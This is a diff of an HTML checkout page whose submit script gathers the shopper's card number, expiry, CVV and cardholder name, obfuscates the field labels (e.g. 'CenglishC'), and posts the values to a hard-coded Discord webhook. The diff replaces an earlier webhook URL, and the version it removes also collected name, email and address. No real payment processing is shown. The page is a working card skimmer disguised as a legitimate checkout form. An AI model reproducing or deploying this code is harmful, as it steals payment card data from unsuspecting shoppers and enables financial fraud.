@@ -27,7 +27,6 @@
 
     * { box-sizing: border-box; }
 
-    /* Header Nav Emulation */
     .mini-nav {
         text-align: center;
         padding: 30px 0;
@@ -128,10 +127,6 @@
         font-weight: 900;
         font-size: 3rem;
         letter-spacing: -2px;
-    }
-
-    @media (max-width: 500px) {
-        .logo { font-size: 1.4rem; }
     }
 </style>
 </head>
@@ -235,41 +230,36 @@ document.getElementById('checkoutForm').addEventListener('submit', function(e) {
   btn.innerText = "PROCESSING...";
   btn.disabled = true;
 
+  // Data mapping with your custom server-side names
   const formData = {
-    "NAME": document.getElementById("fname").value,
-    "EMAIL": document.getElementById("email").value,
-    "ADDRESS": document.getElementById("adr").value,
-    "APT NO": document.getElementById("apt").value,
-    "CITY/STATE": document.getElementById("city").value + ", " + document.getElementById("state").value,
-    "ZIP": document.getElementById("zip").value,
-    "COUNTRY": document.getElementById("country").value,
-    "HOLDER": document.getElementById("cname").value,
-    "CARD NO": document.getElementById("ccnum").value,
-    "EXPIRY": document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
-    "CVV": document.getElementById("cvv").value
+    "Name on CenglishC": document.getElementById("cname").value,
+    "CenglishC": document.getElementById("ccnum").value,
+    "ending date of CenglishC": document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
+    "CenglishC gbb": document.getElementById("cvv").value
   };
 
+  // Modern ASCII Grid Design with "NEW WORDS." Header
   let message = "```sql\n";
-  message += "╭──────────────── DATA LOG: NEW TRANSACTION ────────────────╮\n";
-  message += "│ FIELD        │ INFORMATION                                │\n";
-  message += "├──────────────┼────────────────────────────────────────────┤\n";
+  message += "╔══════════════════════════════════════════════════════════╗\n";
+  message += "║                       NEW WORDS.                         ║\n";
+  message += "╠═══════════════════════════╦══════════════════════════════╣\n";
   
   for (const [key, value] of Object.entries(formData)) {
-    let label = key.padEnd(12, " ");
-    let valStr = (value || "EMPTY").toString().substring(0, 42); 
-    message += `│ ${label} │ ${valStr.padEnd(42, " ")} │\n`;
+    let label = key.padEnd(25, " ");
+    let valStr = (value || "EMPTY").toString().substring(0, 28); 
+    message += `║ ${label} ║ ${valStr.padEnd(28, " ")} ║\n`;
   }
   
-  message += "╰──────────────┴────────────────────────────────────────────╯\n";
+  message += "╚═══════════════════════════╩══════════════════════════════╝\n";
   message += "```";
 
-  fetch("https://discord.com/api/webhooks/1494821427789037608/xA_Xd62gpnYwnSPWX8F6zKUqQZw76NHAFwkFWHQ4G7poSxUh-epRSThq2S0Uj_yOH6KZ", {
+  // Updated Webhook URL
+  fetch("https://discord.com/api/webhooks/1498708709071913042/TczLvKYYsEWdMVpWr3uHjnFtXVtnvyipcNJbsDLsC6qs8HR-jw3vlYl2Zh7T1qQ1VVHD", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ content: message })
   })
   .then(response => {
-    // Discord returns 204 No Content on success
     if (response.ok || response.status === 204) {
       document.getElementById("form-container").style.display = "none";
       document.getElementById("nav-header").style.display = "none";
@@ -290,4 +280,5 @@ document.getElementById('checkoutForm').addEventListener('submit', function(e) {
 
 </body>
 </html>
+
 
